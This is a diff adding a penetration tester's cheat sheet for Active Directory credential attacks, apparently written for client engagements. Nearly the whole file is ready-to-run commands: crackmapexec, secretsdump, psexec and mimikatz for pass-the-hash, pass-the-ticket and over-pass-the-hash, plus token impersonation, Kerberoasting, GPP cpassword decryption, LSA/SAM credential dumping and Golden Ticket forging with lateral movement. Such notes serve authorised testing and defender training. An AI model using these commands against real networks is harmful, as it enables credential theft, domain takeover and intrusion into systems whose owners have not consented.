@@ -1,0 +1,139 @@
+**Using a captured set of credentials**
+
+Pass the Password
+	crackmapexec <smb|ssh|winrm|mssql> <victim IP> -u <username> -d <domain> -p <password>
+
+	get SAM hashes using --sam option
+
+	dump hashes using secretsdump.py, Mimikatz, meterpreter hashdump
+
+	repeat for all machines identified as accessible by crackmapexec
+
+	if possible, crack NTLM hashes using hashcat -m 1000
+	otherwise, try to pass the hash
+
+
+Pass the Ticket
+	collect tickets using mimikatz (see below)
+	import tickets on foothold machine
+		mimikatz.exe "privilege::debug" "kerberos::ptt <path to stolen tickets>" "exit"
+	klist  to confirm tickets are imported
+
+	test success 
+		dir \\<host that user should access>\c$\
+
+Pass the Hash
+	crackmapexec
+		crackmapexec <smb|ssh|winrm|mssql> <victim IP> -u <username> -H <NT hash, i.e. the second one>
+	psexec 
+		psexec.py <username>:@<victim IP> -hashes <LM_hash:NT_hash>
+
+
+Over Pass the Hash
+	Mimikatz  
+		mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<username> /ntlm:<NTLM_hash> /domain:<domain>" "exit"
+
+Trust Attacks
+
+
+
+Token Impersonation
+	Delegate - for logging into a machine or using Remote Desktop
+	Impersonate - non-interactive for attaching network drive or domain logon script
+	
+	Incognito in Meterpreter session
+		load incognito
+		list_tokens -u           (-g for groupname)
+		impersonate_token <domain>\\<admin_username>
+		shell
+	to return to original user in meterpreter session
+		rev2self 		
+
+
+Kerberoasting
+	Capture ticket granting service (TGS) hash
+		GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DC IP> -request
+	Crack TGS hash using hashcat -m 13100
+
+
+Group Policy Preferences (GPP) - MS14-025
+	metasploit
+		auxiliary/smb_enum_gpp
+	
+	manual
+		access SYSVOL folder
+			e.g. using smb
+				smbclient -L \\\\<DC IP>\\
+				smbclient \\\\<DC IP>\\<accessible folder>
+				prompt off
+				recurse on
+				mget *
+		looking for Groups.xml
+			contains cpassword
+
+		gpp-decrypt <cpassword>
+
+
+Credential Dumping
+	meterpreter session
+		dumphash
+
+	secretsdump
+		secretsdump.py <domain>/<username>:<password>@<victim IP>
+	
+	Mimikatz (gentilkiwi/mimikatz/releases)
+		also does Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket and Golden Ticket
+		patch on Windows could break this
+		alternatives
+			Invoke-mimikatz
+			mimidogz
+
+		Download mimikatz_trunk.zip to target (pref DC)
+		Extract and run mimikatz.exe
+			can use PSExec to remotely execute
+				PsExec.exe \\<remote_PC> -accepteula cmd /c (cd <path_to_mimikatz.exe> ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
+
+		Check debugging
+			privilege::debug
+				should return Privilege '20' OK
+		
+		sekurlsa::logonpasswords
+			prior to Win10, wdigest may contain plaintext password
+				can turn on wdigest using Mimikatz
+					wait for another user to login
+
+		lsadump::sam /patch
+
+		lsadump::lsa /patch
+
+	want to provide client with proportion of hashes cracked as an indicator of password policy strength
+
+
+Golden Ticket
+	Mimikatz
+		Download mimikatz_trunk.zip to target (pref DC)
+		Extract and run mimikatz.exe
+		Check debugging
+			privilege::debug
+				should return Privilege '20' OK
+		
+		lsadump::lsa /inject /name:krbtgt
+
+		Get SID of domain
+		Get NTLM hash for krbtgt
+
+		kerberos::golden /User:<any user real or fake> /domain:<domain> /sid:<domain SID> /krbtgt:<krbtgt NTLM hash> /id:500 /ptt
+		
+		Create privileged command line
+			misc::cmd
+		Run privileged commands across the network
+			e.g. view drive contents on another PC
+				dir \\<PC name>\c$
+		Download and run psexec from other PCs
+
+
+
+
+
+
+
